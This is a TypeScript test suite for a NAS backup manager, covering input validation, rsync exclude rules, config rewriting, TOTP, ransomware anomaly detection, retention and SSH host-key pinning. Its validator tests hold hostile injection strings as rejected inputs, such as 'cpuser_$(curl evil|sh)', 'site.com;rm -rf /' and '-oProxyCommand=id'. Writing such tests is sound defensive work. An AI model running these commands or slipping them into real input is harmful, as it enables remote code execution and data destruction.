import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';

import { sanitizeErrorMessage } from '@/lib/api-error';
import { getDb, resetDbConnectionForTests, setSettings } from '@/lib/db';
import { evaluateBackupAnomaly } from '@/lib/engine/anomaly-detector';
import {
  applyConfigReplacements,
  patchRestoredWebConfigOverSsh,
} from '@/lib/engine/config-rewriter';
import {
  parseSafeExcludePatterns,
  validateExcludePatternsInput,
} from '@/lib/engine/exclude-rules';
import {
  buildMorningDigestSummary,
  captureDailyStorageSnapshot,
  getStorageHistory30Days,
  getTopLargestDomains,
} from '@/lib/engine/morning-digest';
import { applyGfsRetentionForServer } from '@/lib/engine/retention-gfs';
import { parseRsyncStats } from '@/lib/engine/rsync-runner';
import {
  assertSafe,
  isSafeDbName,
  isSafeDomain,
  isSafeHostAddress,
  isSafeSnapshotName,
  isSafeSystemUser,
  isSafeWebroot,
  validateServerConnectionFields,
} from '@/lib/engine/safe-names';
import { encodeQrMatrix, renderQrSvg } from '@/lib/qr-svg';
import {
  buildRsyncSshTransport,
  buildSshBaseArgs,
  computeOpenSshKeyFingerprint,
  ensureServerHostKeyPinned,
  materializeServerKnownHostsFile,
} from '@/lib/ssh';
import {
  buildOtpAuthUrl,
  countRemainingRecoveryCodes,
  decodeBase32,
  encryptTotpSecret,
  decryptTotpSecret,
  encodeBase32,
  generateRecoveryCodes,
  generateTotpCode,
  generateTotpSecret,
  verifyAndConsumeRecoveryCode,
  verifyTotpCode,
} from '@/lib/totp';
import type { ServerRecord } from '@/types';

let tempRootDir = '';

before(() => {
  tempRootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nas-sync-v140-tests-'));
  process.env.DATA_DIR = path.join(tempRootDir, 'data');
  process.env.SSH_KEYS_DIR = path.join(tempRootDir, 'ssh_keys');
  process.env.SEED_DEMO = 'false';
  process.env.JWT_SECRET =
    'test-jwt-secret-key-for-nas-sync-v140-automated-suite-256bit';
  resetDbConnectionForTests();
});

after(() => {
  resetDbConnectionForTests();
  if (tempRootDir && fs.existsSync(tempRootDir)) {
    fs.rmSync(tempRootDir, { recursive: true, force: true });
  }
});

describe('1. safe-names validation & shell/path injection blocking', () => {
  it('accepts valid hosting identifiers and rejects command/path injection payloads', () => {
    assert.equal(isSafeDomain('portal.vn'), true);
    assert.equal(isSafeDomain('sub-01.xn--fiqs8s.example.com'), true);
    assert.equal(isSafeDomain('../etc/passwd'), false);
    assert.equal(isSafeDomain('-oProxyCommand=id'), false);
    assert.equal(isSafeDomain('site.com;rm -rf /'), false);

    assert.equal(isSafeSystemUser('da_user01'), true);
    assert.equal(isSafeSystemUser('-root'), false);
    assert.equal(isSafeSystemUser('.ssh'), false);
    assert.equal(isSafeSystemUser('user..escape'), false);
    assert.equal(isSafeSystemUser('user$(whoami)'), false);

    assert.equal(isSafeDbName('cpuser_wp2026'), true);
    assert.equal(isSafeDbName('cpuser_$(curl evil|sh)'), false);
    assert.equal(isSafeDbName('-mysql_opt'), false);
    assert.equal(isSafeDbName('db;DROP TABLE users'), false);

    assert.equal(isSafeHostAddress('103.221.220.15'), true);
    assert.equal(isSafeHostAddress('2001:db8::1'), true);
    assert.equal(isSafeHostAddress('-oProxyCommand=sh'), false);

    assert.equal(isSafeSnapshotName('2026-11-02_01-00'), true);
    assert.equal(isSafeSnapshotName('../2026-11-02'), false);
  });

  it('enforces minimum depth and POSIX traversal safety on webroot paths', () => {
    assert.equal(
      isSafeWebroot('/home/user01/domains/example.com/public_html'),
      true
    );
    assert.equal(isSafeWebroot('/var/www/site01'), true);

    assert.equal(isSafeWebroot('/'), false);
    assert.equal(isSafeWebroot('/home'), false);
    assert.equal(isSafeWebroot('/home/user01'), false);
    assert.equal(isSafeWebroot('/home/user01/../etc/shadow'), false);
    assert.equal(isSafeWebroot('/var/www/site;id'), false);

    assert.throws(() => assertSafe(isSafeWebroot, '/etc', 'Webroot'));
  });

  it('validates full server connection payloads strictly', () => {
    assert.equal(
      validateServerConnectionFields({
        hostname: 'vps-prod-01.example.com',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
        panelType: 'DIRECTADMIN',
        sshPort: 2222,
        bwLimitKbps: 25600,
      }),
      null
    );

    assert.notEqual(
      validateServerConnectionFields({
        hostname: '-bad-host',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
      }),
      null
    );

    assert.notEqual(
      validateServerConnectionFields({
        hostname: 'vps01.example.com',
        ipAddress: '103.221.220.88',
        sshUser: 'root',
        sshPort: 70000,
      }),
      null
    );
  });
});

describe('2. exclude-rules merging & --option injection defense', () => {
  it('merges global and server exclude blocks while filtering comments and unsafe options', () => {
    const merged = parseSafeExcludePatterns(
      '# Global rules\nwp-content/cache/\n*.log\n--rsh=sh -c id\n/',
      'wp-content/updraft/\n*.log\n../secret\nstorage/logs/*.log'
    );

    assert.deepEqual(merged, [
      'wp-content/cache/',
      '*.log',
      'wp-content/updraft/',
      'storage/logs/*.log',
    ]);
  });

  it('blocks rsync flag injection, parent traversal, and wildcard root patterns in UI validator', () => {
    const okRes = validateExcludePatternsInput(
      '# Cache WordPress\nwp-content/cache/\nerror_log\nwp-content/cache/'
    );
    assert.equal(okRes.ok, true);
    assert.equal(okRes.normalized, '# Cache WordPress\nwp-content/cache/\nerror_log');

    for (const bad of [
      '--rsync-path=evil',
      '-e ssh',
      '/',
      '**',
      '/*',
      'wp-content/../../etc/passwd',
      'bad\0null',
    ]) {
      const check = validateExcludePatternsInput(bad);
      assert.equal(check.ok, false, `Expected pattern "${bad}" to be rejected`);
    }
  });
});

describe('3. config-rewriter (wp-config.php, .env, configuration.php)', () => {
  it('rewrites DB names and webroot paths accurately across CMS config formats', () => {
    const wpRaw = `<?php\ndefine('DB_NAME', 'dauser_wpold');\ndefine( "DB_USER", "dauser" );\ndefine('WP_CONTENT_DIR', '/home/dauser/domains/shop.vn/public_html/wp-content');\n`;
    const wpPatched = applyConfigReplacements('wp-config.php', wpRaw, {
      changedDbs: [['dauser_wpold', 'cpuser_wpnew']],
      sourceWebroot: '/home/dauser/domains/shop.vn/public_html',
      targetWebroot: '/home/cpuser/public_html',
    });
    assert.match(wpPatched, /define\('DB_NAME', 'cpuser_wpnew'\)/);
    assert.match(wpPatched, /\/home\/cpuser\/public_html\/wp-content/);

    const envRaw = `APP_NAME=Shop\nDB_HOST=127.0.0.1\nDB_DATABASE="laravel_old"\nexport DB_DATABASE=laravel_old\n`;
    const envPatched = applyConfigReplacements('.env', envRaw, {
      changedDbs: [['laravel_old', 'plesk_laravel_new']],
    });
    assert.match(envPatched, /DB_DATABASE="plesk_laravel_new"/);
    assert.match(envPatched, /export DB_DATABASE=plesk_laravel_new/);

    const joomlaRaw = `<?php\nclass JConfig {\n  public $user = 'juser';\n  public $db = 'joomla_old';\n}\n`;
    const joomlaPatched = applyConfigReplacements(
      'configuration.php',
      joomlaRaw,
      {
        changedDbs: [['joomla_old', 'joomla_migrated']],
      }
    );
    assert.match(joomlaPatched, /public \$db = 'joomla_migrated';/);
  });

  it('atomically patches mock webroot config files and preserves .nas-sync.bak backup', async () => {
    const mockWebroot = path.join(tempRootDir, 'mock_restore_webroot');
    fs.mkdirSync(mockWebroot, { recursive: true });
    const wpFile = path.join(mockWebroot, 'wp-config.php');
    fs.writeFileSync(
      wpFile,
      `<?php\ndefine('DB_NAME', 'src_db');\n`,
      'utf8'
    );

    const mockServer = {
      id: 999,
      hostname: 'mock-target.local',
      ip_address: '127.0.0.1',
      ssh_port: 22,
      ssh_user: 'root',
      ssh_key_path: '',
      panel_type: 'CPANEL',
      assigned_volume_id: null,
      bw_limit_kbps: 0,
      status: 'ONLINE',
      is_mock: 1,
      last_connected_at: null,
      notes: '',
      created_at: new Date().toISOString(),
    } satisfies ServerRecord;

    const res = await patchRestoredWebConfigOverSsh({
      server: mockServer,
      targetUser: 'cpuser',
      targetDomain: 'shop.vn',
      targetWebroot: '/home/cpuser/public_html',
      sourceWebroot: '/home/dauser/domains/shop.vn/public_html',
      dbRenameMap: { src_db: 'dst_db' },
      isMock: true,
      mockWebrootDir: mockWebroot,
      onLog: () => {},
    });

    assert.deepEqual(res.patchedFiles, ['wp-config.php']);
    assert.match(fs.readFileSync(wpFile, 'utf8'), /dst_db/);
    assert.match(fs.readFileSync(`${wpFile}.nas-sync.bak`, 'utf8'), /src_db/);
  });
});

describe('4. totp + qr-svg RFC 6238 verification, recovery codes, QR matrix', () => {
  it('generates and verifies RFC 6238 TOTP codes with +-1 step window and encrypts secrets', () => {
    const rawBuf = Buffer.from('12345678901234567890', 'ascii');
    const b32 = encodeBase32(rawBuf);
    assert.deepEqual(decodeBase32(b32), rawBuf);

    // RFC 6238 Appendix B test vector for SHA1 at T = 59s -> 287082 (8 digits -> 7082 mod 10^6 = 287082)
    assert.equal(generateTotpCode(b32, 59_000), '287082');

    const secret = generateTotpSecret();
    const fixedNow = 1_762_000_000_000;
    const currentCode = generateTotpCode(secret, fixedNow);
    const prevWindowCode = generateTotpCode(secret, fixedNow - 30_000);
    const expiredCode = generateTotpCode(secret, fixedNow - 120_000);

    assert.equal(verifyTotpCode(secret, currentCode, fixedNow), true);
    assert.equal(verifyTotpCode(secret, prevWindowCode, fixedNow), true);
    assert.equal(verifyTotpCode(secret, expiredCode, fixedNow), false);
    assert.equal(verifyTotpCode(secret, '000000', fixedNow) && currentCode !== '000000', false);

    const encrypted = encryptTotpSecret(secret);
    assert.ok(encrypted.startsWith('v1:'));
    assert.equal(decryptTotpSecret(encrypted), secret);
  });

  it('consumes single-use 2FA recovery codes and renders valid ISO 18004 QR SVG', () => {
    const { plainCodes, hashedJson } = generateRecoveryCodes(6);
    assert.equal(plainCodes.length, 6);
    assert.equal(countRemainingRecoveryCodes(hashedJson), 6);

    const firstUse = verifyAndConsumeRecoveryCode(plainCodes[0], hashedJson);
    assert.equal(firstUse.matched, true);
    assert.equal(firstUse.remainingCount, 5);

    const replayUse = verifyAndConsumeRecoveryCode(
      plainCodes[0],
      firstUse.remainingJson
    );
    assert.equal(replayUse.matched, false);
    assert.equal(replayUse.remainingCount, 5);

    const otpUrl = buildOtpAuthUrl('admin', generateTotpSecret(), 'NAS-Sync');
    const matrix = encodeQrMatrix(otpUrl, 'M');
    assert.equal(matrix.size, matrix.version * 4 + 17);
    assert.equal(matrix.modules.length, matrix.size * matrix.size);
    // Top-left finder corner (0,0) must be dark (1)
    assert.equal(matrix.modules[0], 1);

    const svg = renderQrSvg(otpUrl, { width: 200, margin: 1 });
    assert.ok(svg.startsWith('<svg xmlns="http://www.w3.org/2000/svg"'));
    assert.ok(svg.includes('<path fill='));
  });
});

describe('5. anomaly-detector & retention-gfs GFS bucket retention', () => {
  it('detects ransomware file spike anomalies and auto-pins clean historical snapshots', async () => {
    const db = getDb();
    setSettings({
      anomaly_max_changed_percent: '50',
      anomaly_max_delta_gb: '10',
    });

    const vol = db
      .prepare('SELECT id, mount_path FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number; mount_path: string };

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('anomaly-vps.example.com', '103.221.220.201', 22, 'root', 'DIRECTADMIN', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);
    const server = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;

    const cleanJobRes = db
      .prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, anomaly_detected)
         VALUES ('BACKUP', ?, ?, '2026-10-30_01-00', 'COMPLETED', 0, 0)`
      )
      .run(serverId, vol.id);
    const cleanJobId = Number(cleanJobRes.lastInsertRowid);

    const spikeJobRes = db
      .prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, anomaly_detected)
         VALUES ('BACKUP', ?, ?, '2026-10-31_01-00', 'COMPLETED', 0, 0)`
      )
      .run(serverId, vol.id);
    const spikeJobId = Number(spikeJobRes.lastInsertRowid);

    // First backup never triggers false-positive anomaly
    const firstCheck = await evaluateBackupAnomaly({
      jobId: cleanJobId,
      server,
      filesTotal: 500,
      filesChanged: 500,
      deltaSizeBytes: 500 * 1024 * 1024,
      isFirstBackup: true,
      onLog: () => {},
    });
    assert.equal(firstCheck.anomalyDetected, false);

    // Subsequent backup with 90% files changed triggers ransomware guard & pins cleanJobId
    const anomalyCheck = await evaluateBackupAnomaly({
      jobId: spikeJobId,
      server,
      filesTotal: 1000,
      filesChanged: 900,
      deltaSizeBytes: 512 * 1024 * 1024,
      isFirstBackup: false,
      onLog: () => {},
    });
    assert.equal(anomalyCheck.anomalyDetected, true);
    assert.equal(anomalyCheck.pinnedPreviousCount, 1);

    const cleanAfter = db
      .prepare('SELECT is_pinned FROM backup_jobs WHERE id = ?')
      .get(cleanJobId);
    assert.equal(Number(cleanAfter?.is_pinned), 1);
  });

  it('retains GFS daily/weekly/monthly + pinned snapshots and prunes expired intra-day snapshots', async () => {
    const db = getDb();
    const vol = db
      .prepare('SELECT id, mount_path FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number; mount_path: string };

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('gfs-vps.example.com', '103.221.220.202', 22, 'root', 'CPANEL', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);
    const hostDir = path.join(vol.mount_path, 'gfs-vps.example.com');
    fs.mkdirSync(hostDir, { recursive: true });

    const snapshots = [
      // Same day (2026-10-25): 2 snapshots -> newest kept as Latest/Daily, older intra-day pruned
      { name: '2026-10-25_14-00', createdAt: '2026-10-25 14:00:00', pinned: 0 },
      { name: '2026-10-25_02-00', createdAt: '2026-10-25 02:00:00', pinned: 0 },
      // Previous days
      { name: '2026-10-24_01-00', createdAt: '2026-10-24 01:00:00', pinned: 0 },
      { name: '2026-10-23_01-00', createdAt: '2026-10-23 01:00:00', pinned: 0 },
      // Older snapshot outside daily=2, weekly=1, monthly=1 that IS pinned -> must survive
      { name: '2026-08-10_01-00', createdAt: '2026-08-10 01:00:00', pinned: 1 },
      // Older unpinned snapshot in July -> must be pruned when monthly=1
      { name: '2026-07-15_01-00', createdAt: '2026-07-15 01:00:00', pinned: 0 },
    ];

    for (const s of snapshots) {
      const snapDir = path.join(hostDir, s.name);
      fs.mkdirSync(snapDir, { recursive: true });
      fs.writeFileSync(path.join(snapDir, 'marker.txt'), s.name, 'utf8');
      db.prepare(
        `INSERT INTO backup_jobs (job_type, server_id, volume_id, snapshot_name, status, is_pinned, created_at, completed_at)
         VALUES ('BACKUP', ?, ?, ?, 'COMPLETED', ?, ?, ?)`
      ).run(serverId, vol.id, s.name, s.pinned, s.createdAt, s.createdAt);
    }

    const res = await applyGfsRetentionForServer(
      serverId,
      { daily: 2, weekly: 1, monthly: 1 },
      false
    );

    const keptNames = new Set(res.keptSnapshots.map((k) => k.snapshotName));
    assert.ok(keptNames.has('2026-10-25_14-00'), 'Newest snapshot must be kept');
    assert.ok(keptNames.has('2026-10-24_01-00'), 'Second daily bucket must be kept');
    assert.ok(keptNames.has('2026-08-10_01-00'), 'Pinned snapshot must be kept');

    assert.ok(
      res.deletedSnapshots.includes('2026-10-25_02-00'),
      'Redundant same-day snapshot should be pruned'
    );
    assert.ok(
      res.deletedSnapshots.includes('2026-07-15_01-00'),
      'Expired unpinned historical snapshot should be pruned'
    );
    assert.equal(
      fs.existsSync(path.join(hostDir, '2026-07-15_01-00')),
      false
    );
  });
});

describe('6. SSH TOFU Host Key pinning, API sanitizer & Morning Digest / Top Domains', () => {
  it('computes RFC 4253 OpenSSH SHA-256 fingerprints and enforces TOFU + MITM lockdown', async () => {
    const rawKeyA = crypto.randomBytes(51).toString('base64');
    const rawKeyB = crypto.randomBytes(51).toString('base64');
    const expectedDigestA = crypto
      .createHash('sha256')
      .update(Buffer.from(rawKeyA, 'base64'))
      .digest('base64')
      .replace(/=+$/, '');

    const scanLineA = `[103.221.220.210]:2222 ssh-ed25519 ${rawKeyA}`;
    const scanLineB = `[103.221.220.210]:2222 ssh-ed25519 ${rawKeyB}`;

    const fpA = computeOpenSshKeyFingerprint(scanLineA);
    assert.equal(fpA, `SHA256:${expectedDigestA} (SSH-ED25519)`);
    assert.throws(() => computeOpenSshKeyFingerprint('# comment line'));

    const db = getDb();
    const ins = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, is_mock)
         VALUES ('tofu-vps.example.com', '103.221.220.210', 2222, 'root', 'DIRECTADMIN', 0)`
      )
      .run();
    const serverId = Number(ins.lastInsertRowid);

    // 1. Before pinning: StrictHostKeyChecking=accept-new
    const unpinnedSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    assert.equal(unpinnedSrv.host_key_status, 'UNPINNED');
    assert.equal(materializeServerKnownHostsFile(unpinnedSrv), null);
    assert.ok(
      buildSshBaseArgs(unpinnedSrv).includes('StrictHostKeyChecking=accept-new')
    );

    // 2. First connection: TOFU pins key A -> VERIFIED + StrictHostKeyChecking=yes
    const firstPin = await ensureServerHostKeyPinned(
      serverId,
      `# [103.221.220.210]:2222 SSH-2.0-OpenSSH_9.6\n${scanLineA}\n`
    );
    assert.equal(firstPin.status, 'VERIFIED');
    assert.equal(firstPin.fingerprint, fpA);

    const verifiedSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    const khFile = materializeServerKnownHostsFile(verifiedSrv);
    assert.ok(khFile && fs.existsSync(khFile));
    const sshArgsVerified = buildSshBaseArgs(verifiedSrv);
    assert.ok(sshArgsVerified.includes('StrictHostKeyChecking=yes'));
    assert.ok(
      buildRsyncSshTransport(verifiedSrv).includes('StrictHostKeyChecking=yes')
    );

    // 3. Repeat connection with matching key A: stays VERIFIED
    const secondPin = await ensureServerHostKeyPinned(serverId, scanLineA);
    assert.equal(secondPin.status, 'VERIFIED');

    // 4. Unexpected host key change (Key B) -> MISMATCH lockdown + CRITICAL alert!
    await assert.rejects(
      () => ensureServerHostKeyPinned(serverId, scanLineB),
      /\[SECURITY\]/
    );

    const mismatchSrv = db
      .prepare('SELECT * FROM servers WHERE id = ?')
      .get(serverId) as unknown as ServerRecord;
    assert.equal(mismatchSrv.host_key_status, 'MISMATCH');
    assert.equal(mismatchSrv.status, 'ERROR');
    assert.equal(
      mismatchSrv.host_key_pending_fingerprint,
      computeOpenSshKeyFingerprint(scanLineB)
    );

    // SSH & Rsync builders must immediately block MISMATCH server
    assert.throws(() => buildSshBaseArgs(mismatchSrv), /\[SECURITY\]/);
    assert.throws(() => buildRsyncSshTransport(mismatchSrv), /\[SECURITY\]/);
  });

  it('redacts internal filesystem paths and stack traces in sanitizeErrorMessage while keeping Vietnamese errors', () => {
    const domainErr = new Error(
      'Hostname không hợp lệ (không được bắt đầu bằng dấu gạch ngang).'
    );
    assert.equal(
      sanitizeErrorMessage(domainErr),
      'Hostname không hợp lệ (không được bắt đầu bằng dấu gạch ngang).'
    );

    const pathLeakErr = new Error(
      'ENOENT: Không đọc được khóa tại /root/.ssh/id_ed25519 hoặc /volume1/VPS_Backups/secret và D:\\W2W\\app_data\\nas-sync.db\n    at Object.openSync (node:fs:581:3)\n    at test (/app/src/lib/ssh.ts:90:12)'
    );
    const cleaned = sanitizeErrorMessage(pathLeakErr);
    assert.equal(cleaned.includes('/root/.ssh'), false);
    assert.equal(cleaned.includes('/volume1/VPS_Backups'), false);
    assert.equal(cleaned.includes('D:\\W2W'), false);
    assert.equal(cleaned.includes('node:fs'), false);
    assert.ok(cleaned.includes('[redacted-path]'));

    const rawSqliteErr = new Error(
      'SQLITE_ERROR: near "FROM": syntax error in StatementSync'
    );
    assert.equal(
      sanitizeErrorMessage(rawSqliteErr, 'Lỗi truy vấn nội bộ.'),
      'Lỗi truy vấn nội bộ.'
    );
  });

  it('captures 30-day storage snapshots, parses rsync stats, and ranks Top Largest Domains accurately', () => {
    const parsedStats = parseRsyncStats(`
Number of files: 14,250 (reg: 12,800, dir: 1,450)
Number of regular files transferred: 312
Total file size: 2,147,483,648 bytes
Total transferred file size: 52,428,800 bytes
`);
    assert.deepEqual(parsedStats, {
      filesTotal: 14250,
      filesChanged: 312,
      totalBytes: 2147483648,
      deltaBytes: 52428800,
    });

    const db = getDb();
    const vol = db
      .prepare('SELECT id FROM storage_volumes ORDER BY id ASC LIMIT 1')
      .get() as { id: number };
    db.prepare(
      'UPDATE storage_volumes SET used_bytes = ?, total_bytes = ?, free_bytes = ? WHERE id = ?'
    ).run(120 * 1024 ** 3, 500 * 1024 ** 3, 380 * 1024 ** 3, vol.id);

    const srvRes = db
      .prepare(
        `INSERT INTO servers (hostname, ip_address, ssh_port, ssh_user, panel_type, assigned_volume_id, is_mock)
         VALUES ('digest-vps.example.com', '103.221.220.220', 22, 'root', 'PLESK', ?, 1)`
      )
      .run(vol.id);
    const serverId = Number(srvRes.lastInsertRowid);

    const jobRes = db
      .prepare(
        `INSERT INTO backup_jobs
         (job_type, server_id, volume_id, snapshot_name, status, total_size_bytes, delta_size_bytes, created_at, completed_at)
         VALUES ('BACKUP', ?, ?, '2026-11-02_06-00', 'COMPLETED', ?, ?, datetime('now'), datetime('now'))`
      )
      .run(serverId, vol.id, 10 * 1024 ** 3, 1 * 1024 ** 3);
    const jobId = Number(jobRes.lastInsertRowid);

    db.prepare(
      `INSERT INTO backup_items
       (job_id, server_id, volume_id, snapshot_name, system_user, domain_name, webroot_backed_up, webroot_size_bytes, databases_list, verification_status)
       VALUES (?, ?, ?, '2026-11-02_06-00', 'plesk_u1', 'mega-ecommerce.vn', 1, ?, ?, 'PASSED')`
    ).run(
      jobId,
      serverId,
      vol.id,
      6 * 1024 ** 3,
      JSON.stringify([
        {
          name: 'ecom_prod',
          file: 'ecom_prod.sql.zst',
          size_bytes: 2 * 1024 ** 3,
          verified: true,
        },
      ])
    );

    db.prepare(
      `INSERT INTO backup_items
       (job_id, server_id, volume_id, snapshot_name, system_user, domain_name, webroot_backed_up, webroot_size_bytes, databases_list, verification_status)
       VALUES (?, ?, ?, '2026-11-02_06-00', 'plesk_u2', 'landing-blog.vn', 1, ?, ?, 'PASSED')`
    ).run(
      jobId,
      serverId,
      vol.id,
      200 * 1024 ** 2,
      JSON.stringify([
        {
          name: 'blog_db',
          file: 'blog_db.sql.zst',
          size_bytes: 50 * 1024 ** 2,
          verified: true,
        },
      ])
    );

    const snap = captureDailyStorageSnapshot();
    assert.ok(snap.logical_bytes >= 10 * 1024 ** 3);
    assert.ok(snap.verified_dbs_count >= 2);

    const history = getStorageHistory30Days();
    assert.ok(history.length >= 1);
    assert.equal(history[history.length - 1].stat_date, snap.stat_date);

    const topDomains = getTopLargestDomains(5);
    assert.ok(topDomains.length >= 2);
    assert.equal(topDomains[0].domain_name, 'mega-ecommerce.vn');
    assert.equal(topDomains[0].total_domain_bytes, 8 * 1024 ** 3);
    assert.equal(topDomains[0].databases_count, 1);

    const digestSummary = buildMorningDigestSummary();
    assert.ok(digestSummary.hostKeyMismatchCount >= 1); // from tofu-vps test above
    assert.ok(digestSummary.savingsPercent > 0);
    assert.ok(digestSummary.verifiedDbs24h >= 2);
  });
});
